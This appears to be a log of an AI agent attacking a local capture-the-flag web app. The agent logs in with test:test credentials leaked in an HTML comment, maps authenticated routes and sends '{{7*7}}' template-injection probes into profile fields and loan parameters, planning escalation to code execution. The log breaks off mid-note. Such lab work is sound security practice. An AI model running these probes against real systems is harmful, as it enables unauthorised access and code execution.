--- iter 4 bash --- $ cat <<'EOF' STACK: Apache/2.4.67 (Debian) fronting a Python/Flask-like app (Werkzeug-style redirect/404 bodies, Jinja-compatible category hint), static Bootstrap assets. SURFACE: GET / -> 302 /login; GET/POST /login with username,password; static /static/css/bootstrap.min.css /static/css/style.css /static/js/bootstrap.bundle.min.js; probed /robots.txt,/sitemap.xml,/api,/admin,/debug,/healthz,/search(.php),/index.php all 404. BUG-HYP: Authenticated page/form likely renders user-controlled data through template (SSTI) after logging in with disclosed test:test account from /login HTML comment. WHY: /login body contains "TODO: Delete the testing account (test:test)" and category is SSTI; Flask/Jinja-looking responses imply user data may pass through render_template_string or unsafe template rendering after auth. PLAN: - HYPOTHESIS: Flask/Jinja SSTI is reachable in an authenticated route or state-changing form (evidence: Apache + Flask/Werkzeug HTML, test:test credential in login page, SSTI challenge class). - ATTACK CHAIN: login test:test -> harvest authenticated routes/forms/JS -> inject arithmetic SSTI -> fingerprint -> expression gadget to read env/flag via RCE -> flag. - FIRST PROBE: reach-fuzz forms --base http://127.0.0.1:9103 - ABANDON IF: no authenticated or unauthenticated form/route reflects or reacts differentially to template syntax; then fuzz hidden paths and static/JS routes. EOF reach-fuzz forms --base http://127.0.0.1:9103 || true STACK: Apache/2.4.67 (Debian) fronting a Python/Flask-like app (Werkzeug-style redirect/404 bodies, Jinja-compatible category hint), static Bootstrap assets. SURFACE: GET / -> 302 /login; GET/POST /login with username,password; static /static/css/bootstrap.min.css /static/css/style.css /static/js/bootstrap.bundle.min.js; probed /robots.txt,/sitemap.xml,/api,/admin,/debug,/healthz,/search(.php),/index.php all 404. BUG-HYP: Authenticated page/form likely renders user-controlled data through template (SSTI) after logging in with disclosed test:test account from /login HTML comment. WHY: /login body contains "TODO: Delete the testing account (test:test)" and category is SSTI; Flask/Jinja-looking responses imply user data may pass through render_template_string or unsafe template rendering after auth. PLAN: - HYPOTHESIS: Flask/Jinja SSTI is reachable in an authenticated route or state-changing form (evidence: Apache + Flask/Werkzeug HTML, test:test credential in login page, SSTI challenge class). - ATTACK CHAIN: login test:test -> harvest authenticated routes/forms/JS -> inject arithmetic SSTI -> fingerprint -> expression gadget to read env/flag via RCE -> flag. - FIRST PROBE: reach-fuzz forms --base http://127.0.0.1:9103 - ABANDON IF: no authenticated or unauthenticated form/route reflects or reacts differentially to template syntax; then fuzz hidden paths and static/JS routes. [reach-fuzz forms] http://127.0.0.1:9103 form#0 -> POST http://127.0.0.1:9103/login fields=['username', 'password'] [200] len=1900 text/html; charset=utf http://127.0.0.1:9103/login (diff vs GET: len 1642->1900) --- iter 5 bash --- $ cat <<'EOF' STATE (iter 4): - CONFIRMED: target has only unauth login form discovered by reach-fuzz; posting arbitrary defaults changes /login length (iter 4). - REFUTED: none yet. - OPEN: (1) disclosed test:test account unlocks routes; (2) login fields may be vulnerable/oracle; (3) hidden public routes not yet fuzzed. - NEXT: login as test:test and harvest all authenticated links/forms/scripts. EOF python3 <<'PY' import requests, re, urllib.parse base='http://127.0.0.1:9103' s=requests.Session() r=s.get(base+'/login') print('GET /login', r.status_code, r.url, len(r.text), 'cookies', s.cookies.get_dict()) r=s.post(base+'/login', data={'username':'test','password':'test'}, allow_redirects=False) print('POST /login', r.status_code, 'loc', r.headers.get('Location'), 'set-cookie', r.headers.get('Set-Cookie'), 'len', len(r.text)) print(r.text) if r.headers.get('Location'): rr=s.get(urllib.parse.urljoin(base,r.headers['Location'])) print('\n===== FOLLOW', rr.url, rr.status_code, len(rr.text), 'cookies', s.cookies.get_dict(), '=====') print(rr.text) for pat in [r'href=["\']([^"\']+)', r'src=["\']([^"\']+)', r'action=["\']([^"\']+)']: print('EXTRACT', pat, re.findall(pat, rr.text)) PY STATE (iter 4): - CONFIRMED: target has only unauth login form discovered by reach-fuzz; posting arbitrary defaults changes /login length (iter 4). - REFUTED: none yet. - OPEN: (1) disclosed test:test account unlocks routes; (2) login fields may be vulnerable/oracle; (3) hidden public routes not yet fuzzed. - NEXT: login as test:test and harvest all authenticated links/forms/scripts. GET /login 200 http://127.0.0.1:9103/login 1642 cookies {} POST /login 302 loc /home set-cookie session=eyJ1c2VyX2lkIjoxfQ.ajb3mA.OiiQlo_mKFiR8e7O20QY1Yhv6q0; HttpOnly; Path=/ len 197 Redirecting...

See: https://github.com/urllib3/urllib3/issues/3020 warnings.warn( --- iter 6 bash --- $ cat <<'EOF' STATE (iter 5): - CONFIRMED: test:test login succeeds, sets Flask session {user_id:1}, redirects to /home; /home displays Welcome John Doe and links /profile,/loan_details,/logout (iter 5). - REFUTED: public-only surface completeness insufficient; authenticated routes exist. - OPEN: (1) SSTI in profile fields rendered into /home or /profile; (2) SSTI in loan detail fields; (3) IDOR or session tampering possible due simple user_id cookie. - NEXT: fetch /profile and /loan_details authenticated; harvest forms/params/scripts. EOF python3 <<'PY' import requests, re, urllib.parse base='http://127.0.0.1:9103' s=requests.Session(); s.post(base+'/login', data={'username':'test','password':'test'}) for p in ['/profile','/loan_details','/logout','/home']: r=s.get(base+p, allow_redirects=False) print(f'===== GET {p} status={r.status_code} len={len(r.text)} loc={r.headers.get("Location")} ctype={r.headers.get("Content-Type")} =====') print(r.text) print('LINKS', re.findall(r'href=["\']([^"\']+)', r.text)) print('SCRIPTS', re.findall(r'src=["\']([^"\']+)', r.text)) print('FORMS', re.findall(r']*.*?', r.text, flags=re.S|re.I)) PY STATE (iter 5): - CONFIRMED: test:test login succeeds, sets Flask session {user_id:1}, redirects to /home; /home displays Welcome John Doe and links /profile,/loan_details,/logout (iter 5). - REFUTED: public-only surface completeness insufficient; authenticated routes exist. - OPEN: (1) SSTI in profile fields rendered into /home or /profile; (2) SSTI in loan detail fields; (3) IDOR or session tampering possible due simple user_id cookie. - NEXT: fetch /profile and /loan_details authenticated; harvest forms/params/scripts. ===== GET /profile status=200 len=3129 loc=None ctype=text/html; charset=utf-8 ===== Profile

See: https://github.com/urllib3/urllib3/issues/3020 warnings.warn( --- iter 7 bash --- $ cat <<'EOF' STATE (iter 6): - CONFIRMED: authenticated /profile POST updates fields name,lastname,email,loan_amount,loan_term_months,monthly_payment; /loan_details has client AJAX GET /total_loan_payments with principal,payment,term params (iter 6). - REFUTED: /home fetch after /logout was unauth due session cleared, not a route issue. - OPEN: (1) stored SSTI via /profile fields; (2) reflected/query SSTI via /total_loan_payments params; (3) numeric JS context injection via loan fields. - NEXT: run arithmetic SSTI probes in all profile fields and total_loan_payments params, print resulting bodies. EOF python3 <<'PY' import requests, re, json, html base='http://127.0.0.1:9103' def login(): s=requests.Session(); s.post(base+'/login', data={'username':'test','password':'test'}); return s orig={'name':'John','lastname':'Doe','email':'john@example.com','loan_amount':'10000.0','loan_term_months':'60','monthly_payment':'212.47'} # direct endpoint baseline and arithmetic params s=login() for qs in [ {'principal':'10000','payment':'212.47','term':'60'}, {'principal':'{{7*7}}','payment':'1','term':'2'}, {'principal':'100','payment':'{{7*7}}','term':'2'}, {'principal':'100','payment':'1','term':'{{7*7}}'} ]: r=s.get(base+'/total_loan_payments', params=qs) print('===== GET /total_loan_payments', qs, 'status', r.status_code, 'len', len(r.text), '=====') print(r.text) # stored profile fields for field in orig: s=login() data=orig.copy(); data[field]='{{7*7}}' if field=='email': data[field]='x{{7*7}}@a.com' r=s.post(base+'/profile', data=data, allow_redirects=False) print('\n===== POST /profile field',field,'status',r.status_code,'loc',r.headers.get('Location'),'len',len(r.text),'=====') print(r.text) for p in ['/home','/profile','/loan_details']: rr=s.get(base+p) print(f'----- GET {p} after {field} status={rr.status_code} len={len(rr.text)} contains49={"49" in rr.text} containsTpl={"{{7*7}}" in rr.text} -----') print(rr.text) PY STATE (iter 6): - CONFIRMED: authenticated /profile POST updates fields name,lastname,email,loan_amount,loan_term_months,monthly_payment; /loan_details has client AJAX GET /total_loan_payments with principal,payment,term params (iter 6). - REFUTED: /home fetch after /logout was unauth due session cleared, not a route issue. - OPEN: (1) stored SSTI via /profile fields;
